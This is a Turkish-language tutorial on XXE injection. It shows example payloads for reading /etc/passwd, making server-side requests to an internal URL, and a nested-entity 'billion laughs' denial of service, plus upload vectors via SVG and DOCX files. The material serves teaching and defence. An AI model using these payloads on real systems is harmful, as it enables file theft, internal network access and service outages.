# XML External Entity Injection (XXE)

XXE, XML verilerin **Parsing** yapıldığı anda meydana gelir. XML verisine, **harici (external)** entity tanımları dahil edilerek, parsing sırasında XML verilerin işlenmesine müdahale edilmesiyle ortaya çıkmaktadır. XML'in sunduğu bazı özelliklerin kötüye kullanılmasından kaynaklanır.

XML Parser’lar, veriyi ayrıştırırken belge içerisindeki DTD ve Entity tanımlarını okur ve verilen direktiflere göre yorumlar. XML Parser üzerinde, harici entity tanımlarına izin veriliyorsa, saldırganlar XML verilerine harici entity tanımları dahil ederek, parsing sırasında amaçları doğrultusunda işlem yaptırabilir. Bu zafiyet üzerinden, **dosya okuma**, **SSRF (Server-side Request Forgery)** yani sunucu taraflı istek yapılabilmesi veya **hizmet kesintisi (DoS)** saldırıları gerçekleştirilebilir.

### Örnekler

**Dosya Okuma**

Örneğin, bir e-ticaret uygulamasında ürünün stokta olup olmama durumunu sorgularken aşağıdaki gibi bir istek yapıldığını düşünelim.

| <p><strong>&#x3C;?xml version="1.0" encoding="UTF-8"?></strong></p><p><strong>&#x3C;stockCheck></strong></p><p><strong>&#x3C;productId>381&#x3C;/productId></strong></p><p><strong>&#x3C;/stockCheck></strong></p> |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |

Saldırganlar, XML verisine harici entity tanımlaması dahil ederek, sunucu tarafında (yetkileri doğrultusunda) istedikleri dosyaları okuyabilir. Örnek olarak, “test” adında bir entity tanımlanmış ve SYSTEM niteliği üzerinden “/etc/passwd” kaynağı çağrılmıştır.

**Yapılan İstek:**

| <p><strong>&#x3C;?xml version="1.0" encoding="UTF-8"?></strong></p><p><strong>&#x3C;!DOCTYPE demo [</strong></p><p><strong>&#x3C;!ENTITY test SYSTEM "file:///etc/passwd"></strong></p><p><strong>]></strong></p><p><strong>&#x3C;stockCheck></strong></p><p><strong>&#x3C;productId>&#x26;test;&#x3C;/productId></strong></p><p><strong>&#x3C;/stockCheck></strong></p> |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |

**Dönen Cevap:**

| <p><strong>Invalid product ID: root:x:0:0:root:/root:/bin/bash</strong></p><p><strong>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</strong></p><p><strong>bin:x:2:2:bin:/bin:/usr/sbin/nologin</strong></p><p><strong>...</strong></p> |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

**Server-side Request Forgery (SSRF)**

SSRF zafiyeti, sunucu taraflı istek yaptırılabilmesine olanak tanıyan bir güvenlik açığıdır. XXE zafiyeti üzerinden SSRF atakları gerçekleştirilebilir. Örneğin, kullanıcının doğrudan erişim sağlayamadığı ancak uygulama sunucunun erişebildiği, iç ağda yer alan sistemlere erişim sağlanabilir.

**HTTP GET İsteğinin Yapılması:**

| <p><strong>&#x3C;!DOCTYPE demo [</strong></p><p><strong>&#x3C;!ENTITY test SYSTEM "http://internal.vulnerable-website.com/"></strong></p><p><strong>]></strong></p> |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

**Denial of Service (DoS)**

Örneğin, XML veri içerisinde iç içe entity tanımlamaları yapılmasıyla, parsing sırasında gereksiz yük oluşturabilir böylece sistemin hizmet veremez duruma gelmesine sebep olabilir.

**İç İçe Entity Tanımlamaları:**

| <p><strong>&#x3C;?xml version="1.0" encoding="UTF-8"?></strong></p><p><strong>&#x3C;!DOCTYPE lolz [</strong></p><p> <strong>&#x3C;!ENTITY lol "lol"></strong></p><p> <strong>&#x3C;!ELEMENT lolz (#PCDATA)></strong></p><p><strong>&#x3C;!ENTITY lol1 "&#x26;lol;&#x26;lol;&#x26;lol;&#x26;lol;&#x26;lol;&#x26;lol;&#x26;lol;&#x26;lol;&#x26;lol;&#x26;lol;"></strong></p><p> <strong>&#x3C;!ENTITY lol2 "&#x26;lol1;&#x26;lol1;&#x26;lol1;&#x26;lol1;&#x26;lol1;&#x26;lol1;&#x26;lol1;&#x26;lol1;&#x26;lol1;&#x26;lol1;"></strong></p><p> <strong>&#x3C;!ENTITY lol3 "&#x26;lol2;&#x26;lol2;&#x26;lol2;&#x26;lol2;&#x26;lol2;&#x26;lol2;&#x26;lol2;&#x26;lol2;&#x26;lol2;&#x26;lol2;"></strong></p><p> <strong>&#x3C;!ENTITY lol4 "&#x26;lol3;&#x26;lol3;&#x26;lol3;&#x26;lol3;&#x26;lol3;&#x26;lol3;&#x26;lol3;&#x26;lol3;&#x26;lol3;&#x26;lol3;"></strong></p><p> <strong>&#x3C;!ENTITY lol5 "&#x26;lol4;&#x26;lol4;&#x26;lol4;&#x26;lol4;&#x26;lol4;&#x26;lol4;&#x26;lol4;&#x26;lol4;&#x26;lol4;&#x26;lol4;"></strong></p><p><strong>]></strong></p><p><strong>&#x3C;lolz>&#x26;lol5;&#x3C;/lolz></strong></p> |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |

XXE zafiyeti, uygulama yüklenen dosyalar üzerinden de tetiklenebilir. Örneğin, SVG ve ofis dosyaları (.docx ve .xlsx vb.) gibi dosyalar XXE zafiyetini tetiklemek için kullanılabilir. SVG dosya tipi, XML formatlı resim dosyalarıdır. Aynı durum ofis dosyaları için de geçerlidir. Örneğin, .docx uzantılı bir dosyayı zip formatından çıkardığımızda XML uzantılı dosyaları görürüz.

### Örnek Olay

Yaşanmış bir olay ile devam edelim. Geçtiğimiz senelerde, Facebook Careers sayfası üzerinde, XXE zafiyeti tespit edilmişti. Sayfa üzerinde CV yükleme alanı bulunuyordu ve buraya sadece PDF ve DOCX uzantılı dosyalar yüklenebiliyordu. DOCX formatının aslında XML dosyalarından oluştuğunu söylemiştik. Zafiyeti tespit eden güvenlik araştırmacısı, özel olarak hazırladığı DOCX dosyası üzerinden zafiyeti tetikleyebilmişti.
